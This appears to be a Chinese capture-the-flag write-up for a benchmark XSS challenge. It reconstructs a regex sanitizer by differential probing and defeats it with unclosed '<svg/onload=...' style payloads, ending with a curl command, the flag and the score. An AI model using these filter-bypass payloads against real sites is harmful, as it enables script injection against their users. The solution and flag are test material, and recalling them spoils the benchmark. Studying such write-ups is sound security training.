# xben-011-24 · 探索记录

对应题解：[`xben-011-24.md`](./xben-011-24.md)

## 目标与起点

容器 `10.0.173.136:5000`，`Werkzeug/1.0.1 Python/2.7.18`。

`GET /` → `Dalgona Challenges`，入口 `Page`。
`GET /page` 标题 `Dalgona - Star`，样式表 `static/css/xss/xss24.css`
（同族 004=xss25、008=xss21、010=xss32）。

```html
<form class="box-form" method="post">
  <div class="solution-text"><img src=".../new_star.png" alt="Start"><br>Let the game begin. Good Luck</div>
  <input type=text name=solution placeholder="Enter solution...">
</form>
```

反射点在 `<input>` 标签**之后**的文本节点。

## 第一阶段：判据不同 —— 没有 "Sorry you can't use"

先按同族经验试：

| payload | 结果 |
| --- | --- |
| `abc` | `Oops! You did an alert with TypeError: ... instead of "XSS"` |
| `<b>x</b>` | 同上（这其实是页面的默认失败文案，与输入无关） |
| `<input autofocus onfocus=alert("XSS")>` | **页面回到 `Let the game begin`，输入消失** |
| `<script>alert("XSS")</script>` | 默认失败文案 |
| `<img src=x onerror=alert("XSS")>` | 输入消失 |

**关键差异**：这关没有 `Sorry you can't use: 'x'` 这种提示，而是**静默改写**——
某些输入被删掉，页面回到初始态。这说明过滤不是"黑名单拒绝"而是"内容清洗"。

顺手确认了一点：`Oops! ... TypeError ...` 这段文案对**任何**输入都出现，
它是页面自身脚本的报错，不是对 payload 的判定。真正的成功信号只有 `Congratulations`。

## 第二阶段：用差分探针还原 sanitizer

把输入按"反射回来是什么"逐条比对（这是本题最有效的一步）：

| 输入 | 反射 |
| --- | --- |
| `a b` | `ab` |
| `a\tb` / `a\nb` / `a\rb` / `\x0b` | 空白全部删除 |
| `<b>` | （空） |
| `<b>x</b>` | `x` |
| `<b` | `<b` ← **没闭合就活下来** |
| `<img` | `<img` |
| `<>` | `<>` ← 正则要求至少一个字符 |
| `< >` | （空） |
| `<b >` | （空） |
| `<b/x>` | （空） |
| `<<b>>` | `>` ← 匹配到 `<<b>`，剩一个 `>` |
| `1<2` | `1<2` |
| `x>y` | `x>y` |
| `a\x00b` | `a\x00b`（NUL 不删） |

由此确定：

```text
1) re.sub(r'<[^>]+>', '', s)    # 中间至少 1 个字符，且必须以 > 收尾
2) re.sub(r'\s+', '', s)        # 所有空白字符
```

顺序也能定：`< >` 被删光说明**先删标签**（先删空白的话会变成 `<>`，而 `<>` 是活的）。

## 第三阶段：两条规则各找一个缺口

| 规则 | 缺口 |
| --- | --- |
| `<[^>]+>` | 不写 `>` 就躲过正则；浏览器却仍会把它当标签解析，直到遇到下一个 `>` |
| 删空白 | 用 `/` 分隔属性（HTML5 允许） |

试载荷（都不带结尾 `>`，用 `/` 当分隔符）：

| payload | 结果 |
| --- | --- |
| `<svg/onload=alert("XSS")` | **Congratulations** |
| `<body/onload=alert("XSS")` | **Congratulations** |
| `<img/src=x/onerror=alert("XSS")` | 失败（输入仍在，但没触发） |
| `<iframe/srcdoc=x/onload=alert("XSS")` | 失败 |

`svg` / `body` 在未闭合状态下仍能挂上 `onload`；`img` 的属性解析在未闭合时不行。

## 第四阶段：拿 flag

```bash
curl -X POST --data-urlencode 'solution=<svg/onload=alert("XSS")' http://$T/page
```

```html
Congratulations!<p> Here is the flag: flag{e6de05eb-4506-4cbe-8af2-996cda537e21}
```

提交：`correct: true, awarded: 300`。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| 照搬 004/008 的 `<input autofocus onfocus=alert("XSS")>` | 输入被整体删除 | 完整标签被 `<[^>]+>` 吃掉 |
| `<script>alert("XSS")</script>` | 失败（默认文案） | 标签被删，只剩 `alert("XSS")` 文本 |
| `<img src=x onerror=alert("XSS")>` | 输入消失 | 同上，且空格会被删 |
| `<img/src=x/onerror=alert("XSS")`（不闭合） | 未触发 | 未闭合的 `img` 属性解析失败 |
| 带 `>` 的 `<svg/onload=…>` | 被删 | `<[^>]+>` 命中 |
| `<iframe/srcdoc=x/onload=…` | 未触发 | 需要 `srcdoc` 内容配合，未闭合时不可靠 |

## 这次真正的收获

1. **先分清"拒绝"和"改写"。** 前者有明确报错（`Sorry you can't use`），后者静默消失。
   判据不同，解法完全不同：拒绝类换写法，改写类找正则缺口。
   我这题一开始按拒绝类思路试了 004 的 payload，看到"输入消失"才意识到方向要变。
2. **差分探针是还原 sanitizer 最快的办法。** 13 个只差一个字符的输入，
   就同时确定了正则形状（`<[^>]+>`）、空白规则、以及两步的先后顺序。
   全程没看源码，纯黑盒。
3. **`<[^>]+>` 的通用缺口是"不闭合"。** 正则要求 `>`，浏览器不要求——
   它会一直吞到文档里下一个 `>`。这时模板里的 `</form>` 就成了"免费的闭合符"。
4. **删空白时用 `/` 分隔属性。** HTML5 解析器把 `/` 当属性分隔符，
   `<svg/onload=x>` 与 `<svg onload=x>` 等价。这条对"过滤空格"普遍成立。
5. **同一招要换标签试。** `svg`/`body` 成功、`img`/`iframe` 失败。
   未闭合标签能不能挂上事件处理器，取决于标签自身的属性解析规则，
   所以准备 2–3 个变体比死磕一个更划算。
